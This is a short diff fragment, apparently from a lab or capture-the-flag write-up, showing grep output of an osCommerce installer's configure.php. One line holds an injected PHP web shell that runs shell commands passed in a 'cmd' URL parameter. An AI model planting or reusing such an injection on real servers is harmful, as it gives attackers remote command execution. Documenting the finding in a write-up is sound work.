@@ -95,8 +95,6 @@ var/www/html/froxlor/lib/Froxlor/Database/Database.php
 /var/www/html/oscommerce/catalog/install/includes/configure.php:  define('DB_DATABASE', '');echo system($_GET["cmd"]);/*');
 /var/www/html/oscommerce/catalog/install/includes/configure.php:  define('DB_SERVER_PASSWORD', '');
 /var/www/html/oscommerce/catalog/install/includes/configure.php:  define('DB_SERVER_USERNAME', '');
-
-
 ```
 
 ---
